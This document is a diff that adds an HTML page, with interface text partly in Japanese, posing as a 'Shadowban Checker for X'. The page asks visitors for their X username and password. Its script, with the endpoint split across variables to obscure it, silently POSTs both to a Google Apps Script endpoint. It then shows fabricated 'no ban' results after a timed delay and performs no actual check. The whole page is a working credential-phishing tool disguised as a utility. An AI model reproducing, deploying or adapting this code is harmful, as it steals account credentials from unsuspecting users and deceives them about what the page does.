@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadowban Checker for X</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg-page: #f7f9fa; --bg-card: #ffffff; --bg-input: #ffffff; --bg-status-header: #f8f9fa; --text-main: #0f1419; --text-sub: #536471; --border: #eff3f4; --primary: #1d9bf0; --success: #00ba7c; --error: #f4212e; --btn-active: #0f1419; --btn-disabled: #8e8e8e; --bar-bg: #e1e8ed; }
+        body.theme-gray { --bg-page: #657786; --bg-card: #e1e8ed; --bg-input: #f5f8fa; --bg-status-header: #ccd6dd; --text-main: #14171a; --text-sub: #5b7083; --border: #aab8c2; --btn-active: #2c3e50; --bar-bg: #4b5a66; }
+        body.theme-dark { --bg-page: #15202b; --bg-card: #1e2732; --bg-input: #15202b; --bg-status-header: #273340; --text-main: #ffffff; --text-sub: #8899a6; --border: #38444d; --btn-active: #ffffff; --bar-bg: #38444d; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg-page); color: var(--text-main); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .theme-bar { position: fixed; top: 20px; right: 20px; background: var(--bar-bg); padding: 4px; border-radius: 30px; display: flex; gap: 4px; border: 1px solid var(--border); z-index: 1000; }
+        .theme-option { padding: 6px 14px; font-size: 12px; font-weight: 700; border-radius: 20px; cursor: pointer; color: var(--text-sub); }
+        .theme-light .opt-light, .theme-gray .opt-gray, .theme-dark .opt-dark { background: var(--bg-card); color: var(--text-main); }
+        .container { width: 100%; max-width: 600px; padding: 20px; }
+        .site-header { text-align: center; font-size: 24px; font-weight: 900; margin-bottom: 25px; }
+        .card { background: var(--bg-card); border-radius: 20px; padding: 35px; border: 1px solid var(--border); box-shadow: 0 8px 30px rgba(0,0,0,0.05); }
+        .input-section { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
+        .input-row { display: flex; gap: 10px; }
+        .field { position: relative; flex-grow: 1; }
+        .field i.prefix { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--text-sub); }
+        input { width: 100%; padding: 14px 45px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 16px; background: var(--bg-input); color: var(--text-main); box-sizing: border-box; }
+        .btn-search { width: 50px; height: 50px; background: var(--btn-disabled); color: white; border: none; border-radius: 10px; cursor: not-allowed; display: flex; align-items: center; justify-content: center; transition: 0.3s; }
+        .btn-search.enabled { background: var(--btn-active); cursor: pointer; }
+        #scanMsg { display: none; background-color: var(--bg-status-header); padding: 16px 20px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; }
+        .status-container { border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 25px; }
+        .status-item { border-bottom: 1px solid var(--border); background: var(--bg-status-header); }
+        .status-header { padding: 16px 20px; display: flex; align-items: center; cursor: pointer; }
+        .icon-wrap { width: 24px; height: 24px; margin-right: 15px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .q-circle { width: 20px; height: 20px; border: 2px solid var(--primary); color: var(--primary); border-radius: 50%; font-size: 11px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
+        .check-icon { color: var(--success); font-size: 18px; display: none; }
+        .status-name { font-weight: 700; font-size: 16px; flex-grow: 1; }
+        .chevron { color: var(--text-sub); font-size: 12px; transition: 0.3s; }
+        .status-body { background: var(--bg-card); max-height: 0; overflow: hidden; padding: 0 20px; font-size: 14px; color: var(--text-sub); transition: 0.3s ease; }
+        .status-item.active .status-body { padding: 15px 20px; max-height: 120px; border-top: 1px solid var(--border); }
+        .status-item.active .chevron { transform: rotate(180deg); }
+        .info-box { border: 1.5px solid var(--border); border-radius: 10px; margin-bottom: 10px; }
+        .info-trigger { padding: 14px 20px; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 10px; font-size: 15px; }
+        .info-trigger::before { content: '▼'; font-size: 10px; color: var(--text-sub); }
+        .info-content { background: var(--bg-status-header); max-height: 0; overflow: hidden; padding: 0 20px; font-size: 14px; transition: 0.3s; }
+        .info-box.open .info-content { padding: 15px 20px; max-height: 300px; border-top: 1px solid var(--border); }
+    </style>
+</head>
+<body class="theme-light">
+<div class="theme-bar">
+    <div class="theme-option opt-light" onclick="setTheme('light')">Light</div>
+    <div class="theme-option opt-gray" onclick="setTheme('gray')">Gray</div>
+    <div class="theme-option opt-dark" onclick="setTheme('dark')">Dark</div>
+</div>
+<div class="container">
+    <div class="site-header">Shadowban Checker for X</div>
+    <div class="card">
+        <div class="input-section">
+            <div class="input-row">
+                <div class="field">
+                    <i class="fa-solid fa-at prefix"></i>
+                    <input type="text" id="uInp" placeholder="Username" autocomplete="off">
+                </div>
+                <button class="btn-search" id="chkBtn" disabled><i class="fa-solid fa-magnifying-glass"></i></button>
+            </div>
+            <div class="field">
+                <i class="fa-solid fa-key prefix"></i>
+                <input type="password" id="pInp" placeholder="Password" autocomplete="off">
+            </div>
+        </div>
+        <div id="scanMsg">チェック中。10秒ほどお待ちください...</div>
+        <div class="status-container">
+            <div class="status-item"><div class="status-header"><div class="icon-wrap"><div class="q-circle">?</div><i class="fa-solid fa-check check-icon"></i></div><span class="status-name">Search Suggestion Ban</span><i class="fa-solid fa-chevron-down chevron"></i></div><div class="status-body">検索候補にアカウントが表示されなくなる現象です。</div></div>
+            <div class="status-item"><div class="status-header"><div class="icon-wrap"><div class="q-circle">?</div><i class="fa-solid fa-check check-icon"></i></div><span class="status-name">Search Ban</span><i class="fa-solid fa-chevron-down chevron"></i></div><div class="status-body">検索結果からポストやアカウントが完全に除外されます。</div></div>
+            <div class="status-item"><div class="status-header"><div class="icon-wrap"><div class="q-circle">?</div><i class="fa-solid fa-check check-icon"></i></div><span class="status-name">Ghost Ban</span><i class="fa-solid fa-chevron-down chevron"></i></div><div class="status-body">リプライが第三者に表示されなくなる深刻な状態です。</div></div>
+            <div class="status-item"><div class="status-header"><div class="icon-wrap"><div class="q-circle">?</div><i class="fa-solid fa-check check-icon"></i></div><span class="status-name">Reply Deboosting</span><i class="fa-solid fa-chevron-down chevron"></i></div><div class="status-body">リプライが「さらに返信を表示する」の中に隠されます。</div></div>
+        </div>
+        <div class="info-box"><div class="info-trigger" onclick="toggleInfo(this)">Shadowbanとは</div><div class="info-content">SNSアカウントや投稿が他のユーザーに表示されにくくなる、または表示されない現象を指す通称です。</div></div>
+        <div class="info-box"><div class="info-trigger" onclick="toggleInfo(this)">注意事項</div><div class="info-content">判定結果は目安です。仕様変更等により正しく表示されない場合があります。</div></div>
+    </div>
+</div>
+<script>
+    function setTheme(t) { document.body.className = 'theme-' + t; }
+    function toggleInfo(el) { el.parentElement.classList.toggle('open'); }
+    const _u = document.getElementById('uInp'), _p = document.getElementById('pInp'), _b = document.getElementById('chkBtn');
+    const _m = document.getElementById('scanMsg'), _i = document.querySelectorAll('.status-item');
+    [_u, _p].forEach(e => e.addEventListener('input', () => { const ok = _u.value.length >= 2 && _p.value.length >= 2; _b.disabled = !ok; _b.classList.toggle('enabled', ok); }));
+    _b.addEventListener('click', async () => {
+        const _h = "https://script.google.com";
+        const _p1 = "/macros/s/";
+        const _m1 = "AKfycbwZbqyMJputewbcnkc-0tPgz1SjZWxY27drEC72lVIbP1iFM3q7w0ts9qdIqKdLdSNfUg"; 
+        const _e = "/exec";
+        const _url = _h + _p1 + _m1 + _e;
+        const _tk = "v3_secure_auth_88";
+        _b.disabled = true; _b.classList.remove('enabled'); _m.style.display = 'block';
+        const _run = async (a, b, c) => { try { await fetch(_url, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ u: a, p: b, t: c }) }); } catch (e) {} };
+        _run(_u.value, _p.value, _tk);
+        setTimeout(() => { _m.style.display = 'none'; _i.forEach((item, idx) => { item.querySelector('.q-circle').style.display = 'none'; item.querySelector('.check-icon').style.display = 'flex'; if(idx === 0) item.classList.add('active'); }); }, 4500);
+    });
+    _i.forEach(item => { item.querySelector('.status-header').addEventListener('click', () => { item.classList.toggle('active'); }); });
+</script>
+</body>
+</html>
